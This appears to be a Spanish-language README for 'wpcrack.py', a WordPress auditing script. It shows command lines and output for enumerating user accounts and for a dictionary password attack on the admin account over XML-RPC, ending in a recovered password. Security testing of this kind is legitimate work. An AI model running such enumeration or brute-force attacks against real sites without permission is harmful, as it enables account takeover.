wordpress-security
==================

<h3>wpcrack.py</h3>

<p>
Script para auditar la seguridad de un wordpress. Funcionalidades actuales:
<ul>
<li>Enumeración de usuarios tanto por GET como por POST.</li>
<li>Ataque de diccionario utilizando el servicio XML-RPC.</li>
</ul>
</p>
<p>
Ejemplo de enumeración de usuarios con id menor o igual a 10 utilizando peticiones POST:
<pre>
$ python wpcrack.py --quiet --url http://target/ enumerate -m POST
[+] User found (uid: 4): theboss
[+] User found (uid: 3): user2
[+] User found (uid: 2): user1
[+] User found (uid: 1): admin
</pre>
</p>
Ejemplo de ataque de diccionario a la cuenta de admin mostrando también las peticiones erróneas:
<pre>
$ python wpcrack.py --url http://192.168.0.30/wordpress/ bruteforce -u admin -w dict.txt[-] The password '1234admin' doesn't match
[-] The password '1234password' doesn't match
[-] The password 'password' doesn't match
[-] The password 'pass1234' doesn't match
[-] The password 'adminstrator' doesn't match
[-] The password '123456' doesn't match
[-] The password '1234' doesn't match

[+] Username: admin
[+] Password: admin
[+] Profile : administrator
</pre>
<p>
</p>
<p>Agradecimientos por sus sugerencias a J. M. Fernández, @TheXC3LL</p>

